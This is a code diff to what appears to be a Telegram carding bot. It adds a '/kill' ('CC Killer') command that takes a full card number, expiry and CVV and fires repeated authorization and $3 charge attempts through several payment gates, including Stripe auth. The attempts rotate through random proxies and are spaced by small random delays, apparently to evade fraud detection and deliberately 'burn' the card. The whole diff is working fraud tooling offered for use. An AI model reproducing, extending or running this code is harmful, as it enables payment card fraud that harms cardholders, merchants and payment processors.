@@ -1316,7 +1316,74 @@ def handle_update(update):
             send_message(chat_id, f"<b>No active task.</b>\n\n<i>{DEVELOPER}</i>")
         return
 
-    # --- /gen ---
+    # --- /kill (CC Killer — burn a card via rapid multi-gate auth) ---
+    if text.startswith("/kill"):
+        if not is_authorized(user_id):
+            send_message(chat_id, fmt_unauthorized())
+            return
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2 or '|' not in parts[1]:
+            send_message(chat_id,
+                "<b>💀 CC Killer</b>\n\n"
+                "<b>Usage:</b> <code>/kill CC|MM|YY|CVV</code>\n\n"
+                "Rapidly attempts multiple auth gates to burn/void the card.\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+
+        cc_input = parts[1].strip()
+        c_data = cc_input.split('|')
+        if len(c_data) != 4:
+            send_message(chat_id, f"<b>Invalid format.</b>\n\nUse: <code>/kill CC|MM|YY|CVV</code>\n\n<i>{DEVELOPER}</i>")
+            return
+
+        send_message(chat_id,
+            f"<b>💀 Killing Card...</b>\n\n"
+            f"<code>{cc_input}</code>\n\n"
+            f"Running rapid auth attempts across all gates...")
+
+        def _run_kill():
+            kill_gates = ["auth", "sa1", "sa2", "chg3"]
+            gate_labels = {"auth": "Stripe Auth", "sa1": "SA1 CCN", "sa2": "SA2 CVV", "chg3": "$3 Charge"}
+            proxies_list = list(_global_proxies) if _global_proxies else []
+            results_lines = []
+            total_attempts = 0
+
+            for gate in kill_gates:
+                if not is_gate_enabled(gate):
+                    results_lines.append(f"⏭ {gate_labels[gate]}: <code>Skipped (disabled)</code>")
+                    continue
+
+                for attempt in range(3):
+                    total_attempts += 1
+                    proxy_dict = format_proxy(random.choice(proxies_list)) if proxies_list else None
+                    try:
+                        result = _run_gate(gate, c_data[0], c_data[1], c_data[2], c_data[3], proxy_dict)
+                        r_lower = result.lower() if isinstance(result, str) else ""
+                        if "approved" in r_lower or "charged" in r_lower:
+                            results_lines.append(f"✅ {gate_labels[gate]} #{attempt+1}: <code>AUTH'D (burned)</code>")
+                        elif "declined" in r_lower:
+                            detail = result.split(" | ", 1)[1] if " | " in result else result
+                            results_lines.append(f"❌ {gate_labels[gate]} #{attempt+1}: <code>{detail[:40]}</code>")
+                        else:
+                            results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{result[:40] if isinstance(result, str) else 'Error'}</code>")
+                    except Exception as e:
+                        results_lines.append(f"⚠️ {gate_labels[gate]} #{attempt+1}: <code>{str(e)[:40]}</code>")
+                    time.sleep(random.uniform(0.1, 0.3))
+
+            name = f"@{username}" if username else str(user_id)
+            send_message(chat_id,
+                f"<b>💀━━━⌁ CC KILLER ⌁━━━💀</b>\n\n"
+                f"[🝂] CARD: <code>{cc_input}</code>\n"
+                f"[🝂] ATTEMPTS: <code>{total_attempts}</code>\n"
+                f"[🝂] KILLED BY: {name}\n\n"
+                f"<b>💀━━━━💀 RESULTS 💀━━━━💀</b>\n\n"
+                + "\n".join(results_lines) +
+                f"\n\n<i>{DEVELOPER}</i>")
+
+        threading.Thread(target=_run_kill, daemon=True).start()
+        return
+
+
     if text.startswith("/gen") and text.split()[0] == "/gen":
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
